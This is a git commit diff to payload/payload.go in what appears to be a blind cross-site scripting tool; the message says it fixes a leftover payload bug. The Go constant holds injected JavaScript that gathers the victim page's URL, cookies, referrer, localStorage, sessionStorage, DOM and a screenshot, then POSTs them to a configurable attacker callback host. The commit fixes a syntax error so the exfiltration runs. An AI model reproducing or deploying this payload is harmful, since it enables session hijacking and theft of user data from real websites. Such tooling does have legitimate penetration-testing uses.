3394dede9c83299ff2dfcfe7c73e31875da30fcf
TRYblog <3099920039@qq.com>
2023-04-17 14:54:23 +0800

    修复遗留的payload_bug

--- payload/payload.go
+++ payload/payload.go
@@ -2,9 +2,9 @@ package payload
 
 //TODO 生成payload
 
-const payload =`
+const payload = `
 function ez_n(e){return void 0!==e?e:""}
-function ez_cb(e){var t=new XMLHttpRequest;t.open("POST","//%s/callback",!0),t.setRequestHeader("Content-Time","%s"),t.setRequestHeader("Content-type","text/plain"),t.onreadystatechange=function(){4==t.readyState&&t.status},const base64Data = btoa(JSON.stringify(e)),t.send(base64Data)}
+function ez_cb(e){var t=new XMLHttpRequest;t.open("POST","//%s/callback",!0),t.setRequestHeader("Content-Time","%s"),t.setRequestHeader("Content-type","text/plain"),t.onreadystatechange=function(){4==t.readyState&&t.status},t.send(JSON.stringify(e))}
 function ez_hL(){try{ez_rD.uri=ez_n(location.toString())}catch(e){ez_rD.uri=""}try{ez_rD.cookies=ez_n(document.cookie)}catch(e){ez_rD.cookies=""}try{ez_rD.referer=ez_n(document.referrer)}catch(e){ez_rD.referer=""}try{ez_rD.origin=ez_n(location.origin)}catch(e){ez_rD.origin=""}try{ez_rD.localstorage=ez_n(window.localStorage);}catch(e){ez_rD.localstorage="";}try{ez_rD.sessionstorage=ez_n(window.sessionStorage);}catch(e){ez_rD.sessionstorage="";}try{ez_rD.dom=%s}catch(e){ez_rD.dom=""}
 try{ez_rD.uuid="%s"}catch(e){ez_rD.uuid="%s"}try{html2canvas(document.body).then(function(e){ez_rD.screenshot=ez_n(e.toDataURL()),ez_c();});}catch(e){ez_rD.screenshot="",ez_c()}
 function ez_c(){ez_nW(),ez_cb(ez_rD),ez_cp()}}
